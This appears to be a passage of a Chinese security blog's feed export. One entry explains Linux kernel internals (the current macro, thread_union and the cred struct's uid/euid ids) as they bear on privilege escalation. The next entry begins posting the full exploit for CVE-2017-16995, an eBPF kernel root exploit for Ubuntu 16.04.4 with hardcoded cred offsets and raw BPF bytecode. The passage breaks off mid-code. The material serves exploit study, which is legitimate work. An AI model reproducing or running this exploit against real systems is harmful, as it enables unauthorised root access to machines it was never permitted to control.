class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">current_top_of_stack</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line"><span class="keyword">return</span> this_cpu_read_stable(cpu_tss.x86_tss.sp0);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">/* sp0 on x86_32 is special in and around vm86 mode. */</span></span><br><span class="line"><span class="keyword">return</span> this_cpu_read_stable(cpu_current_top_of_stack);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，是通过读<code>cpu_tss.x86_tss.sp0</code>来获得此时cpu正在处理的进程(即caller)相对应的内核栈信息</p><p>可以看看<code>cpu_tss.x86_tss.sp0</code>是如何实现的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * per-CPU TSS segments. Threads are completely &#x27;soft&#x27; on Linux,</span></span><br><span class="line"><span class="comment"> * no more per-task TSS&#x27;s. The TSS size is kept cacheline-aligned</span></span><br><span class="line"><span class="comment"> * so they are allowed to end up in the .data..cacheline_aligned</span></span><br><span class="line"><span class="comment"> * section. Since TSS&#x27;s are completely CPU-local, we want them</span></span><br><span class="line"><span class="comment"> * on exact cacheline boundaries, to eliminate cacheline ping-pong.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">__visible <span class="title">DEFINE_PER_CPU_SHARED_ALIGNED</span><span class="params">(struct tss_struct, cpu_tss)</span> </span>= &#123;</span><br><span class="line">.x86_tss = &#123;</span><br><span class="line">.sp0 = TOP_OF_INIT_STACK,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_32</span></span><br><span class="line">.ss0 = __KERNEL_DS,</span><br><span class="line">.ss1 = __KERNEL_CS,</span><br><span class="line">.io_bitmap_base= INVALID_IO_BITMAP_OFFSET,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> &#125;,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_32</span></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * Note that the .io_bitmap member must be extra-big. This is because</span></span><br><span class="line"><span class="comment">  * the CPU will access an additional byte beyond the end of the IO</span></span><br><span class="line"><span class="comment">  * permission bitmap. The extra byte must be all 1 bits, and must</span></span><br><span class="line"><span class="comment">  * be within the limit.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">.io_bitmap= &#123; [<span class="number">0</span> ... IO_BITMAP_LONGS] = ~<span class="number">0</span> &#125;,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line">EXPORT_PER_CPU_SYMBOL(cpu_tss);</span><br></pre></td></tr></table></figure><p>接着看看<code>TOP_OF_INIT_STACK</code>宏是如何实现的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TOP_OF_INIT_STACK ((unsigned long)&amp;init_stack + sizeof(init_stack) - \</span></span><br><span class="line">   TOP_OF_KERNEL_STACK_PADDING</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;c</span><br><span class="line">#define init_stack(init_thread_union.stack)</span><br></pre></td></tr></table></figure><p>看到这儿，也就大概明白了，如果大家还记得上一个小节说到的<code>thread_union</code>结构体，那么就很好理解了</p><p>所以实际上<code>TOP_OF_INIT_STACK</code>宏就相当于<strong><em>cpu正在处理的进程的内核栈起始地址(不是rsp，而是thread_union结构体的首地址) + 栈大小(0x4000)</em></strong></p><p>那么又由于<code>esp0</code>就等于<code>TOP_OF_INIT_STACK</code>，我们把值带回<code>current_thread_info</code>函数看看，可以得到<code>current_thread_info</code>函数的返回值就是<strong><em>cpu正在处理的进程的thread_union结构体的首地址</em></strong></p><p>进一步回带<code>get_current</code>函数，就可以很轻松地推出其返回值为<strong><em>cpu正在处理的进程的task_struct结构体的首地址</em></strong>，也就是<code>current</code>的值</p><p>那么简单来说，内核可以通过明确知道正在发出请求的caller进程对应的<code>task_struct</code>结构体在何处，而且由于我们之前讲到过，<code>task_struct</code>结构体中的<code>stack</code>成员指向<code>thread_union</code>(也即内核栈起始地址)，所以，通过current宏，内核就可以获得所有必要的信息来对caller所请求的操作做出响应</p><h1 id="xID"><a href="#xID" class="headerlink" title="xID"></a>xID</h1><p>这部分可能不太能归类为内核方面的知识，不过同样很重要，也是怕自己搞混,所以整理一下权当记录</p><p>在提权的过程中，我们找到了<code>thread_union</code>结构体的地址，读取了指向<code>task_struct</code>结构体的指针值，并借此找到了<code>task_struct</code>的<code>cred</code>结构体成员的地址，最后利用<code>cred</code>成员的地址找到了对应的uid&amp;&amp;guid的地址，写入代表root的0，完成提权</p><p>可以看到<code>cred</code>结构体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="keyword">void</span>*put_addr;</span><br><span class="line"><span class="keyword">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="keyword">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到有许多的xid，那么我就来总结一下<code>uid</code>、<code>gid</code>、<code>suid</code>、<code>sgid</code>、<code>euid</code>、<code>egid</code>的区别</p><p>首先是<code>uid</code>及<code>gid</code></p><p><code>uid</code>及<code>gid</code>在用户登录时就被决定，在整个登陆期间几乎是不会改变的，这两个值代表了正在执行操作的用户是谁</p><p>接着是<code>euid</code>及<code>egid</code></p><p><code>euid</code>及<code>egid</code>在一般情况下和<code>uid</code>及<code>gid</code>一致，即<code>uid=euid,gid=egid</code></p><p>但是，当程序被设置<code>suid</code>或者<code>sgid</code>后，情况就不一样了</p><p>如果一个可执行程序被设置了<code>suid</code>，那么，在执行程序时，<code>euid</code>及<code>egid</code>将会有所不同</p><p>打个比方</p><p>假设kevin用户的uid和gid分别为204和202，foo用户的uid和gid为 200，201</p><p>如果普通文件myfile是属于foo用户的，是可执行的，现在没设SUID位，ls命令显示如<code>-rwxr-xr-x 1 foo staff 7734 Apr 05 17:07 myfile</code></p><p>那么任何用户都可以执行这个程序</p><p>此时kevin执行此程序时，程序的<code>cred</code>结构体中，<code>uid=euid=204,gid=egid=202</code></p><p>而如果被设置了<code>suid</code>，也即ls命令显示如下<code>-rwsr-xr-x 1 foo staff 7734 Apr 05 17:07 myfile</code></p><p>那么，当kevin执行此程序时，<code>uid=204,gid=202,euid=200,egid=201</code></p><p>也就是说，此时kevin执行的这个程序具有它的属主foo的资源访问权限</p><p>在内核的角度来看，一个进程能否访问资源是基于此进程的<code>euid</code>及<code>egid</code>，所以如果myfile程序能够读文件，那么kevin就可以使用myfile程序读取任意属于foo的文件</p><p>再举一个<code>sgid</code>的例子</p><p>UNIX系统有一个<code>/dev/kmem</code>的设备文件，是一个字符设备文件，里面存储了核心程序要访问的数据，包括用户的口令。所以这个文件不能给一般的用户读写，权限设为：<code>cr--r----- 1 root system 2, 1 May 25 1998 kmem</code></p><p>但ps等程序要读这个文件，而ps的权限设置如下：</p><p><code>-r-xr-sr-x 1 bin system 59346 Apr 05 1998 ps</code></p><p>这是一个设置了SGID的程序，而ps的用户是bin，不是root，所以不能设置SUID来访问kmem，但要注意的是，bin和root都属于 system组，而且ps设置了SGID，一般用户执行ps，就会获得system组用户的权限，而文件kmem的同组用户的权限是可读，所以一般用户执行ps就没问题了</p><p>最后回到提权的问题上来，在我们修改了<code>uid</code>及<code>gid</code>、<code>euid</code>及<code>egid</code>后，我们执行了<code>system</code>函数，新被fork出来的进程将会继承父进程的<code>cred</code>结构体，子进程的<code>real_cred</code>结构体将被赋值为我们修改的<code>cred</code>结构体，故而提供了一个root shell</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还需要研究一下<code>cap_bprm_set_creds</code>函数，这是execve重新设置fork后的子进程的uid&amp;&amp;gid&amp;&amp;各种id的关键函数</p><p>另外还有一些重要的类似<code>dentry，inode</code>也会在后面记录一些重点</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-16995 -- 利用</title>
      <link href="CVE-2017-16995-exploit.html"/>
      <url>CVE-2017-16995-exploit.html</url>
      
        <content type="html"><![CDATA[<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>首先贴一下完整的payload</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ubuntu 16.04.4 kernel priv esc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * all credits to @bleidl</span></span><br><span class="line"><span class="comment"> * - vnik</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tested on:</span></span><br><span class="line"><span class="comment">// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64</span></span><br><span class="line"><span class="comment">// if different kernel adjust CRED offset + check kernel stack size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHYS_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_OFFSET 0x5f8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID_OFFSET 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROGSIZE 328</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> mapfd, progfd;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *__prog =     </span><br><span class="line">        <span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span> <span class="comment">//BPF_REG_0 = 0xffffffff</span></span><br><span class="line">        <span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span> <span class="comment">//if BPF_REG_0 == -1 &#123;  </span></span><br><span class="line">        <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span> <span class="comment">// BPF_REG_0 = 0&#125; </span></span><br><span class="line">        <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span> <span class="comment">// exit(0)</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">        <span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">        <span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">        <span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type prog_type,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">const</span> struct bpf_insn *insns, <span class="keyword">int</span> prog_len,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">const</span> <span class="keyword">char</span> *license, <span class="keyword">int</span> kern_version)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .prog_type = prog_type,</span><br><span class="line">        .insns = (__u64)insns,</span><br><span class="line">        .insn_cnt = prog_len / <span class="keyword">sizeof</span>(struct bpf_insn),</span><br><span class="line">        .license = (__u64)license,</span><br><span class="line">        .log_buf = (__u64)bpf_log_buf,</span><br><span class="line">        .log_size = LOG_BUF_SIZE,</span><br><span class="line">        .log_level = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    attr.kern_version = kern_version;</span><br><span class="line"></span><br><span class="line">    bpf_log_buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="keyword">int</span> key_size, <span class="keyword">int</span> value_size,</span></span></span><br><span class="line"><span class="function"><span class="params">           <span class="keyword">int</span> max_entries)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_type = map_type,</span><br><span class="line">        .key_size = key_size,</span><br><span class="line">        .value_size = value_size,</span><br><span class="line">        .max_entries = max_entries</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span 